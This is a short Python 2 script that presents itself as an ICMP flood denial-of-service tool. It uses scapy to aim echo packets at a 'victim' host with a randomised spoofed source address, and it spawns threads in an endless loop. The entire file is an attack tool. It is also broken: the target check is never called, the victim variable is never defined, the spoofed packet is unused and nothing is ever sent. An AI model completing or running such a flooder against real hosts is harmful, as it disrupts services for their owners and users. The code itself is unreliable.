#!/usr/bin/env python
#author Aiden

import socket, random, sys , threading ,re 
from scapy.all import *

class icmpflood(threading.Thread):
	try:
		def check(self):
			global target,victim
			rep = victim.replace('.','')
			check = rep.isdigit()
			if check == True:
				target = victim 
			elif check == False and 'http'or'https' in victim:
				if victim.count("/")==2:
					victim = victim + "/"
				m = re.search('(https?\://)?([^/]*)/?.*', victim)
				host = m.group(2)
				target = socket.gethostbyname(host)

		def __init__(self):
			threading.Thread.__init__(self)
		def run(self):
			i = IP()
			i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
			packet = IP(dst=target)/ICMP(type=8 ,code=0)
	except KeyboardInterrupt:
		sys.exit(1)
	except:
		print 'Victim not available!'
		sys.exit(1)

while True:
	icmpflood().start()
